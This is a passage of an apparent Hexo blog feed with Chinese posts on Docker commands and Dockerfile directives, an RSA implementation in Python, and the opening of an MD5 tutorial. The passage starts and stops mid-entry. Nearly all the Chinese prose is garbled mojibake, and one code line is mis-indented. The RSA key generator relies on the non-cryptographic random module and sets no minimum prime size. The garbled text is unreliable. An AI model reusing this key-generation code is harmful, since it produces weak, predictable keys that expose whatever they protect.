      <content type="html"><![CDATA[<p>æœ€è¿‘åœ¨å‡ºé¢˜ç›®ï¼ŒDockerfileæœ‰äº›ä¸œè¥¿å¿˜è®°äº†<a id="more"></a>ï¼Œé‡æ–°å›é¡¾ä¸€ä¸‹</p><h4 id="å®¹å™¨å‘½ä»¤"><a href="#å®¹å™¨å‘½ä»¤" class="headerlink" title="å®¹å™¨å‘½ä»¤"></a>å®¹å™¨å‘½ä»¤</h4><p>æ–°å»ºå¹¶å¯åŠ¨å®¹å™¨ï¼šdocker run [opotions] IMAGE [COMMAND] [Args..]</p><p>-i : äº¤äº’å¼è¿è¡Œå¹¶ä¸”ä¸-tç›¸äº’è¿è¡Œ</p><p>-t ï¼šæ–°å»ºä¸€ä¸ªç»ˆç«¯</p><p>â€“nameï¼šç›´æ¥è·Ÿæ–°å»ºçš„åå­—</p><p>docker ps:æŸ¥çœ‹æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„å®¹å™¨ -aæŸ¥çœ‹å†å²è¿è¡Œè¿‡çš„å®¹å™¨ -l ä¸Šæ¬¡è¿è¡Œçš„ -n åŠ ä¸ªæ•°å­—æ˜¾ç¤ºæœ€è¿‘å‡ æ¬¡åˆ›å»ºçš„å®¹å™¨ -q æ˜¾ç¤ºå®¹å™¨ç¼–å·  å¯ä»¥ä»¥æ­¤åˆ é™¤å®¹å™¨</p><p>é€€å‡ºå®¹å™¨ï¼šä¸¤ç§ï¼š1. exit  å®¹å™¨åœæ­¢é€€å‡º 2. ctrl+P+Q  å®¹å™¨ä¸åœæ­¢å¹¶é€€å‡º</p><p>å¯åŠ¨å®¹å™¨ï¼šdocker start å®¹å™¨ID</p><p>é‡å¯å®¹å™¨ï¼š docker restart å®¹å™¨ID</p><p>åœæ­¢å®¹å™¨ï¼š docker stop å®¹å™¨IDæˆ–åå­—</p><p>å¼ºåˆ¶åœæ­¢å®¹å™¨ï¼šdocker kill å®¹å™¨IDæˆ–åå­—</p><p>åˆ é™¤å·²ç»åœæ­¢çš„å®¹å™¨ï¼šdocker rm å®¹å™¨IDæˆ–åå­— æ²¡æœ‰åœæ­¢çš„åŠ ä¸ª -f</p><p>åˆ é™¤å…¨éƒ¨ docker rm -f  $(docker ps -aq)</p><p>-Pï¼šéšæœºç«¯å£æ˜ å°„</p><p>-pï¼šæŒ‡å®šç«¯å£æ˜ å°„ï¼Œæœ‰ä»¥ä¸‹å››ç§æ ¼å¼</p><p>ip:hostPort:containerPort</p><p>ip:containerPort</p><p>hostPort:containerPort</p><p>contarinerPort</p><p>å¯åŠ¨å®ˆæŠ¤å®¹å™¨ï¼š -d åå°è¿è¡Œå¹¶è¿”å›ID</p><p>ä½†æ˜¯ç”¨è¿™ç§æ–¹æ¡ˆå¯åŠ¨çš„dockerä½¿ç”¨pså‘½ä»¤æ˜¯çœ‹ä¸åˆ°å…¶å®¹å™¨è¿›ç¨‹ï¼Œå› ä¸ºä»–å·²ç»é€€å‡ºäº†ï¼ŒDockeråå°è¿è¡Œå°±å¿…é¡»æœ‰ä¸€ä¸ªå‰å°è¿›ç¨‹ï¼Œå¦‚æœä¸æ˜¯é‚£äº›ä¸€ç›´æŒ‚æ°”çš„å‘½ä»¤å¦‚(top,tail)ï¼Œå°±æ˜¯ä¼šè‡ªåŠ¨å¯åŠ¨çš„</p><p>æŸ¥çœ‹å®¹å™¨æ—¥å¿— docker logs -f -t â€“tail å®¹å™¨ID -tæ—¶é—´æˆ³ -fè·Ÿéšæœ€æ–°æ—¥å¿—æ‰“å° â€“tailè·Ÿæ•°å­—è¡¨ç¤ºæœ€åå‡ æ¡</p><p>æŸ¥çœ‹å®¹å™¨å†…è¿›ç¨‹ï¼šdocker top å®¹å™¨åå­—ã€ID</p><p>æŸ¥çœ‹å®¹å™¨å†…éƒ¨çš„ç»†èŠ‚ï¼šdocker inspect å®¹å™¨ID</p><p>è¿›å…¥æ­£åœ¨è¿è¡Œçš„å®¹å™¨ï¼š docker exec -it å®¹å™¨ID /bin/bashï¼ˆå¥½åƒä¸€å®šè¦å†™ï¼Œè¯•äº†ä¸€ä¸‹ï¼Œä¸å†™è¿›ä¸å»ï¼Œå†™ä¸å†™éƒ½å¯ä»¥ï¼Œä¹Ÿå¯ä»¥æ˜¯å…¶ä»–å‘½ä»¤ï¼Œåˆ™è¾“å‡ºå‘½ä»¤æ˜¾ç¤ºçš„ç»“æœï¼‰ </p><p>æˆ–è€…æ˜¯docker attach å®¹å™¨IDï¼Œå¯¹æ¯”ä¸€ä¸‹å¯ä»¥çŸ¥é“execåŠŸèƒ½æ›´å¤š</p><p>ä»å®¹å™¨å†…æ‹·è´æ–‡ä»¶åˆ°ä¸»æœºä¸Šï¼šdocker cp å®¹å™¨ID:å®¹å™¨é‡Œé¢çš„è·¯å¾„ ä¸»æœºæœ¬åœ°è·¯å¾„(å¯ä»¥æ”¹ä¸€ä¸‹åå­—)</p><h4 id="Dockeré•œåƒ"><a href="#Dockeré•œåƒ" class="headerlink" title="Dockeré•œåƒ"></a>Dockeré•œåƒ</h4><p>æ˜¯ä»€ä¹ˆï¼Ÿè”åˆæ–‡ä»¶ç³»ç»Ÿ   æœ€å¤§å¥½å¤„ ï¼Ÿå…±äº«èµ„æº</p><p>æ­£å¸¸çš„å‘½ä»¤å°±ä¸è¯´äº†ï¼Œçœ‹æ–‡æ¡£å°±å¯ä»¥ã€‚</p><p>docker commit æäº¤å®¹å™¨å‰¯æœ¬ä½¿ä¹‹æˆä¸ºä¸€ä¸ªæ–°çš„é•œåƒ</p><p>docker commit -m æäº¤æè¿°çš„ä¿¡æ¯ -a ä½œè€… å®¹å™¨ID  è¦åˆ›å»ºçš„ç›®æ ‡é•œåƒåï¼š[æ ‡ç­¾å]</p><p>è¯´æ˜å¯åç€æ¥</p><h5 id="å®¹å™¨æ•°æ®å·"><a href="#å®¹å™¨æ•°æ®å·" class="headerlink" title="å®¹å™¨æ•°æ®å·"></a>å®¹å™¨æ•°æ®å·</h5><p>ç›´æ¥å‘½ä»¤æ·»åŠ  ï¼šdocker run -it -v  /å®¿ä¸»æœºç»å¯¹è·¯å¾„ç›®å½•:/å®¹å™¨å†…ç›®å½• é•œåƒå</p><p>å®¹å™¨å’Œå®¿ä¸»æœºä¹‹é—´æ•°æ®å…±äº«</p><p>å¸¦æƒé™çš„docker run -it -v  /å®¿ä¸»æœºç»å¯¹è·¯å¾„ç›®å½•:/å®¹å™¨å†…ç›®å½•:ro é•œåƒå</p><p>Dockerfileæ·»åŠ </p><p>å¯åœ¨Dockerfileä¸­ä½¿ç”¨VOLUMNæŒ‡ä»¤æ¥ç»™é•œåƒæ·»åŠ ä¸€ä¸ªæˆ–å¤šä¸ªæ•°æ®å·</p><p>æ–°å»ºä¸€ä¸ªDockerfileç„¶åé€šè¿‡buildè¿è¡Œæ–°å»ºé•œåƒ</p><p>docker build -f  æ–‡ä»¶è·¯å¾„ -t  è‡ªå·±çš„åå­—ç©ºé—´/centos  .</p><p>è¦æ‰¾é»˜è®¤åœ°å€ç”¨inspectå‘½ä»¤æŸ¥çœ‹</p><p>å®¹å™¨æ•°æ®å…±äº« â€“volumns-from å„è‡ªæ·»åŠ éƒ½èƒ½å…±äº«ï¼Œè€Œä¸”æ³¨æ„ä¸€ä¸‹è¿™ç‚¹ï¼Œæ•°æ®å·çš„ç”Ÿå‘½å‘¨æœŸä¸€ç›´åˆ°æ²¡æœ‰å®¹å™¨ä½¿ç”¨å®ƒä¸ºæ­¢</p><h4 id="Dockerfileè§£æ"><a href="#Dockerfileè§£æ" class="headerlink" title="Dockerfileè§£æ"></a>Dockerfileè§£æ</h4><p>æ¯æ¡ä¿ç•™å­—æŒ‡ä»¤å¹¶ä¸”åé¢è‡³å°‘ä¸€ä¸ªå‚æ•°ï¼Œè€Œä¸”æ˜¯ä»ä¸Šå¾€ä¸‹é¡ºåºæ‰§è¡Œï¼Œ#è¡¨ç¤ºæ³¨é‡Š</p><p>æ¯æ¡æŒ‡ä»¤éƒ½ä¼šåˆ›å»ºæ–°çš„é•œåƒå±‚ï¼Œå¹¶å¯¹é•œåƒè¿›è¡Œæäº¤</p><p>ä¿ç•™å­—æŒ‡ä»¤</p><p>FROM åŸºç¡€é•œåƒ </p><p>MAINTAINER é•œåƒç»´æŠ¤è€…çš„å§“åå’Œé‚®ç®±</p><p>RUN å®¹å™¨æ„å»ºæ—¶éœ€è¦è¿è¡Œçš„å‘½ä»¤</p><p>EXPOSE å½“å‰å®¹å™¨å¯¹å¤–æš´éœ²çš„ç«¯å£å·</p><p>WORKDIR æŒ‡å®šåˆ›å»ºå®¹å™¨åï¼Œç»ˆç«¯é»˜è®¤ç™»å½•è¿›æ¥çš„å·¥ä½œç›®å½•ï¼Œä¸€ä¸ªè½è„šç‚¹</p><p>ENV ç”¨æ¥åœ¨æ„å»ºé•œåƒè¿‡ç¨‹ä¸­è®¾ç½®ç¯å¢ƒå˜é‡</p><p>ADD å°†å®¿ä¸»æœºç›®å½•ä¸‹çš„æ–‡ä»¶æ‹·è´è¿›äº¬å‘ä¸”ADDå‘½ä»¤ä¼šè‡ªåŠ¨å¤„ç†URLå’Œè§£å‹taråŒ…</p><p>COPY ç±»ä¼¼ADDæ‹·è´æ–‡ä»¶å’Œç›®å½•åˆ°é•œåƒä¸­1.COPY src dest 2.COPY [â€œsrcâ€,â€destâ€]</p><p>VOLUME å®¹å™¨æ•°æ®å·ï¼Œç”¨äºä¿å­˜æ•°æ®</p><p>CMD å¯ä»¥æœ‰å¤šä¸ªå‘½ä»¤ï¼Œä½†ä¼šè¢«docker runä¹‹åæ›¿æ¢æœ€åä¸€ä¸ªå‘½ä»¤ï¼Œè€Œä¸”ä¸èƒ½è¿½åŠ æŸä¸ªå‘½ä»¤çš„é€‰é¡¹</p><p>ENTRYPOINT è·ŸCMDç±»ä¼¼ï¼Œä½†æ˜¯å¯ä»¥è¿½åŠ ã€‚</p>]]></content>
      
      <categories>
          
          <category> ç¯å¢ƒéƒ¨ç½² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¯å¢ƒéƒ¨ç½² </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>RSAåŸç†åŠPythonå®ç°</title>
      <link href="/RSA-python.html"/>
      <url>/RSA-python.html</url>
      <content type="html"><![CDATA[<h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>RSAæ˜¯ç¬¬ä¸€ä¸ªå®‰å…¨ï¼Œå®ç”¨çš„å…¬é’¥åŠ å¯†ç®—æ³•ï¼Œå·²æˆä¸ºå›½å®¶æ ‡å‡†ï¼Œæ˜¯ç›®å‰åº”ç”¨å¹¿æ³›çš„å…¬é’¥åŠ å¯†ä½“åˆ¶ï¼ŒRSAçš„åŸºç¡€æ˜¯æ•°è®ºçš„æ¬§æ‹‰å®šç†<a id="more"></a>ï¼Œå®ƒçš„å®‰å…¨æ€§ä¾èµ–äºå¤§æ•´æ•°å› å­åˆ†è§£çš„å›°éš¾æ€§ï¼Œå› ä¸ºåŠ è§£å¯†æ¬¡åºå¯æ¢ï¼Œå¯ç”¨äºåŠ è§£å¯†ï¼Œå¯ç”¨äºè®¾è®¡æ•°å­—ç­¾åä½“åˆ¶ã€‚</p><h3 id="ç®—æ³•æµç¨‹"><a href="#ç®—æ³•æµç¨‹" class="headerlink" title="ç®—æ³•æµç¨‹"></a>ç®—æ³•æµç¨‹</h3><ol><li>é€‰å–ä¸¤ä¸ªå®‰å…¨çš„å¤§ç´ æ•°på’Œq(å…¶é•¿åº¦è¦è¶³å¤Ÿé•¿è‡³å°‘è¦æ˜¯1024ä½)</li><li>è®¡ç®—ä¹˜ç§¯n = p <em> q, è®¡ç®—phi(n) = (p-1)</em>(q-1)ï¼Œå…¶ä¸­phi(n)ä¸ºnçš„æ¬§æ‹‰å‡½æ•°</li><li>éšæœºé€‰å–æ•´æ•°eï¼Œä½œä¸ºå…¬é’¥ï¼Œè¦æ±‚æ»¡è¶³gcd(e, phi(n)) =1 ,å³eä¸phi(n)äº’ç´ </li><li>ç”¨æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•è®¡ç®—ç§é’¥dã€‚æ»¡è¶³d * e=1(mod phi(n))ï¼Œeå’Œnæ˜¯å…¬é’¥ï¼Œdæ˜¯ç§˜é’¥ã€‚ </li></ol><p>æˆ‘çš„ä»£ç æ˜¯å›ºå®šäº†å…¬é’¥ä¸º65537ï¼Œäº§ç”Ÿçš„ä¸¤ä¸ªå¤§ç´ æ•°æ˜¯é€šè¿‡Miller-Rabinç®—æ³•è¿›è¡Œå¡‘ç´ æ€§æ£€æµ‹å¹¶ä¸”äº§ç”Ÿç´ æ•°pè¿˜æœ‰qã€‚</p><h3 id="æ ¸å¿ƒä»£ç åŠåˆ†æ"><a href="#æ ¸å¿ƒä»£ç åŠåˆ†æ" class="headerlink" title="æ ¸å¿ƒä»£ç åŠåˆ†æ"></a>æ ¸å¿ƒä»£ç åŠåˆ†æ</h3><p>é¦–å…ˆæ˜¯å…ˆäº§ç”Ÿä¸¤ä¸ªå¤§ç´ æ•°på’Œqï¼Œè¿™é‡Œçš„æ ¸å¿ƒä»£ç æ˜¯ä¸‹é¢çš„ä»£ç ï¼Œè¿™é‡Œæ˜¯æ ¹æ®æ¶ˆæ¯çš„é•¿åº¦å»äº§ç”Ÿpå’Œqï¼Œæ€ä¹ˆçŸ¥é“è¿™ä¸¤å¤§æ•°æ˜¯ä¸ªç´ æ•°å‘¢ï¼Ÿå°±å¾—é€šè¿‡Miller-Rabinæ¦‚ç‡ç´ æ•°æµ‹è¯•ç®—æ³•ï¼Œå…ˆåˆ¤æ–­ä¸€æ¬¡è´¹é©¬å°å®šç†ï¼Œæ»¡è¶³çš„è¯å°±æœ‰å¯èƒ½æ˜¯ä¸€ä¸ªç´ æ•°ï¼Œç„¶åå†ç»è¿‡5æ¬¡çš„Miller-Rabinç´ æ€§æµ‹è¯•ï¼Œè¿™æ ·å°±å¯ä»¥å¾ˆå¤§æ¦‚ç‡è¯´æ˜å…¶æ˜¯ç´ æ•°ï¼Œä¸¤æ¬¡è°ƒç”¨è¿™æ ·çš„è¿‡ç¨‹å°±å¯ä»¥äº§ç”Ÿpå’Œqã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#è¾—è½¬ç›¸é™¤æ³•æ±‚æœ€å¤§å…¬å› æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a &gt; b: a, b = b, a</span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        a, b = b, a%b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isPrime</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    åˆ¤æ–­ä¸€ä¸ªæ•°æ˜¯å¦ä¸ºç´ æ•°</span></span><br><span class="line"><span class="string">    å„æ‹‰æ‰˜å¡å¸ˆé™¤æ³• </span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, int(math.sqrt(n)) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> n % i== <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#å¼€å§‹é€‰æ‹©p q</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_prime</span><span class="params">(half_len)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        n = random.randint(<span class="number">0</span>, <span class="number">1</span> &lt;&lt; half_len)<span class="comment">#æ±‚2^half_lenä¹‹é—´çš„å¤§æ•°</span></span><br><span class="line">        <span class="keyword">if</span> n % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">            found = <span class="keyword">True</span></span><br><span class="line">            <span class="comment"># éšæœºæ€§æµ‹è¯•</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">5</span>):   <span class="comment">#5çš„æ—¶å€™é”™è¯¯ç‡å·²ç»å°äºåƒåˆ†ä¹‹ä¸€</span></span><br><span class="line">                <span class="keyword">if</span> prime_test(n) == <span class="keyword">False</span>:</span><br><span class="line">                    found = <span class="keyword">False</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> found == <span class="keyword">True</span>:</span><br><span class="line">                <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"><span class="comment">#Miller-Rabin</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prime_test</span><span class="params">(n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        æµ‹è¯•næ˜¯å¦ä¸ºç´ æ•°</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        q = n - <span class="number">1</span></span><br><span class="line">        k = <span class="number">0</span></span><br><span class="line">        <span class="comment"># å¯»æ‰¾k,q æ˜¯å¦æ»¡è¶³2^k*q =n - 1</span></span><br><span class="line">        <span class="keyword">while</span> q % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            k += <span class="number">1</span></span><br><span class="line">            q = q // <span class="number">2</span></span><br><span class="line">        a = random.randint(<span class="number">2</span>, n - <span class="number">2</span>)</span><br><span class="line">        <span class="comment"># å¦‚æœ a^q mod n= 1, n å¯èƒ½æ˜¯ä¸€ä¸ªç´ æ•°</span></span><br><span class="line">        <span class="keyword">if</span> fast_mod(a, q, n) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="comment"># å¦‚æœå­˜åœ¨jæ»¡è¶³ a ^ ((2 ^ j) * q) mod n == n-1, n å¯èƒ½æ˜¯ä¸€ä¸ªç´ æ•°</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, k):</span><br><span class="line">            <span class="keyword">if</span> fast_mod(a, (<span class="number">2</span> ** j) * q, n) == n - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="comment"># n ä¸æ˜¯ç´ æ•°</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure><p>å› ä¸ºæ˜¯å›ºå®šå¥½å…¬é’¥e=65537çš„ï¼Œæ‰€ä»¥ä¸‹ä¸€æ­¥çš„å…³é”®å°±æ˜¯è¦å®ç°é€šè¿‡æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•å»æ±‚å‡ºç§é’¥dï¼Œè¿™é‡Œé¢çš„å…³é”®ä»£ç å¦‚ä¸‹ï¼Œå…ˆæ˜¯æ±‚å‡ºphi(n)ç„¶åå°±é€šè¿‡æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•æ±‚å‡ºç§é’¥dï¼Œç„¶æ‰©å±•æ¬§å‡ é‡Œçš„ç®—æ³•ä½¿ç”¨äº†é€’å½’çš„æ–¹æ³•å»å®ç°ï¼Œä½†æ˜¯äº§ç”Ÿçš„ç§é’¥dæœ‰å¯èƒ½æ˜¯ä¸€ä¸ªè´Ÿæ•°ï¼Œä½ å¾—å¯¹å…¶è¿›è¡Œå¤„ç†ï¼Œæœ€åäº§ç”Ÿä¸€ä¸ªå¤§äºé›¶çš„ç§é’¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_key</span><span class="params">(key_len)</span>:</span> <span class="comment">#key_lenè¦æ¯”æ¶ˆæ¯é•¿åº¦å¤§</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    ç”Ÿæˆn, e, d</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    p = random_prime(key_len // <span class="number">2</span>)</span><br><span class="line">    q = random_prime(key_len // <span class="number">2</span>)</span><br><span class="line">    n  = p * q</span><br><span class="line">    ph_n = (p <span class="number">-1</span>) * (q <span class="number">-1</span>)</span><br><span class="line">    print(<span class="string">"ph_n:"</span>+str(ph_n))</span><br><span class="line">    e = <span class="number">65537</span> <span class="comment">#eå–å›ºå®šå€¼</span></span><br><span class="line">    d = generate_d(ph_n, e)</span><br><span class="line">    <span class="keyword">return</span> (n ,e, d)</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">ext_gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y, q = ext_gcd(b, a % b)</span><br><span class="line">        x, y = y, (x - (a // b) * y)</span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br><span class="line">        </span><br><span class="line">   <span class="comment">#äº§ç”Ÿç§˜é’¥d</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_d</span><span class="params">(ph_n, e)</span>:</span></span><br><span class="line">    (x, y, r) = ext_gcd(ph_n, e)</span><br><span class="line">    <span class="comment"># y maybe &lt; 0, so convert it</span></span><br><span class="line">    <span class="keyword">if</span> y &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment">#return y % ph_n</span></span><br><span class="line">        <span class="keyword">return</span> y + ph_n  <span class="comment">#ç›´æ¥ç”¨åŠ æ³•æ•ˆç‡é«˜ä¸€ä¸¢ä¸¢</span></span><br><span class="line">    <span class="keyword">return</span> y</span><br></pre></td></tr></table></figure><p>åœ¨æ‰§è¡Œè¿ç®—çš„æ—¶å€™ä½¿ç”¨äº†ä¸€ä¸ªå¿«é€Ÿå¹‚çš„æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å¯ä»¥å°†æ•°å€¼å¤§ä¸€ç‚¹çš„æ•°ç®€åŒ–å…¶æ¨¡å¹‚è¿ç®—çš„è¿‡ç¨‹ï¼Œä»£ç å¦‚ä¸‹ï¼Œå½“ç„¶è¿™æ ·çš„è¿‡ç¨‹ä¹Ÿå¯ä»¥ä½¿ç”¨pythoné‡Œé¢çš„powå‡½æ•°å»å®ç°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fast_mod</span><span class="params">(b, n, m)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    å¿«é€Ÿå¹‚</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    ret = <span class="number">1</span></span><br><span class="line">    tmp = b</span><br><span class="line">    <span class="keyword">while</span> n:</span><br><span class="line">        <span class="keyword">if</span> n &amp; <span class="number">0x1</span>:</span><br><span class="line">            ret = ret * tmp % m</span><br><span class="line">        tmp = tmp * tmp % m</span><br><span class="line">        n &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br></pre></td></tr></table></figure><h3 id="æ­£ç¡®æ€§"><a href="#æ­£ç¡®æ€§" class="headerlink" title="æ­£ç¡®æ€§"></a>æ­£ç¡®æ€§</h3><p>ä»¥â€helloworldaaaâ€ä¸ºä¾‹èƒ½å¤Ÿæ­£ç¡®åŠ è§£å¯†å¹¶ä¸”è¾“å‡ºåŠ è§£å¯†çš„å…¬é’¥ä»¥åŠç§é’¥ã€‚</p><p><a href="https://imgchr.com/i/F5RHAO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/02/F5RHAO.png" alt="F5RHAO.png"></a></p><h3 id="è¯¦ç»†ä»£ç -æ”¾åœ¨githubä¸Šäº†-ï¼šRSAåŠ è§£å¯†"><a href="#è¯¦ç»†ä»£ç -æ”¾åœ¨githubä¸Šäº†-ï¼šRSAåŠ è§£å¯†" class="headerlink" title="è¯¦ç»†ä»£ç (æ”¾åœ¨githubä¸Šäº†)ï¼šRSAåŠ è§£å¯†"></a>è¯¦ç»†ä»£ç (æ”¾åœ¨githubä¸Šäº†)ï¼š<a href="https://github.com/0v3rW4tch/Cryptography-course-design" target="_blank" rel="noopener">RSAåŠ è§£å¯†</a></h3>]]></content>
      
      <categories>
          
          <category> å¯†ç å­¦ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¯†ç å­¦ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>MD5åŸç†åŠPythonå®ç°</title>
      <link href="/MD5-python.html"/>
      <url>/MD5-python.html</url>
      <content type="html"><![CDATA[<h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>MD5æ¶ˆæ¯æ‘˜è¦ç®—æ³•ä¸€ç§è¢«å¹¿æ³›ä½¿ç”¨çš„å¯†ç æ•£åˆ—å‡½æ•°ï¼Œè¾“å…¥é•¿åº¦å°äº2^64æ¯”ç‰¹çš„æ¶ˆæ¯ï¼Œæˆ‘çš„ä»£ç ä¹Ÿæ˜¯ä»¥å°äº2^64æ¯”ç‰¹çš„æ¶ˆæ¯ä¸ºä¾‹ï¼Œè¾“å‡ºä¸€ä¸ª128ä½ï¼ˆ16å­—èŠ‚ï¼‰çš„æ•£åˆ—å€¼<a id="more"></a>ï¼ˆhash valueï¼‰ï¼Œè¾“å…¥ä¿¡æ¯ä»¥512æ¯”ç‰¹çš„åˆ†ç»„ä¸ºå•ä½å¤„ç†ã€‚</p><h3 id="ç®—æ³•æµç¨‹"><a href="#ç®—æ³•æµç¨‹" class="headerlink" title="ç®—æ³•æµç¨‹"></a>ç®—æ³•æµç¨‹</h3><ol><li>é™„åŠ ä½å¡«å……</li><li>åˆå§‹åŒ–é“¾æ¥å˜é‡</li><li>åˆ†ç»„å¤„ç†</li><li>æ­¥å‡½æ•°çš„è¿ç®—</li></ol><p>è¿™ä¸ªæµç¨‹æè¿°ä¸‹æ¥éå¸¸ç¬¦åˆhashå‡½æ•°çš„ä¸€èˆ¬æ¨¡å‹ï¼š</p><p><img src="https://s1.ax1x.com/2018/12/25/FgKNgH.png" alt="FgKNgH.png"></p><p>å•ä¸ªç‚¹æ‹¿å‡ºæ¥ä»”ç»†åˆ†æ</p><h4 id="é™„åŠ ä½å¡«å……"><a href="#é™„åŠ ä½å¡«å……" class="headerlink" title="é™„åŠ ä½å¡«å……"></a>é™„åŠ ä½å¡«å……</h4><p>å¡«å……ä¸€ä¸ª1å’Œè‹¥å¹²ä¸ª0ä½¿æ¶ˆæ¯é•¿åº¦æ¨¡512ä¸448åŒä½™ï¼Œä¹Ÿå°±è¯´å‰©ä½™æ¶ˆæ¯(æ­¤å¤„çš„æ¶ˆæ¯é•¿åº¦å·²ç»ä¸æ»¡512ä½äº†)çš„æœ€å512æ¯”ç‰¹åˆ†ç»„é‡Œé¢åŠ 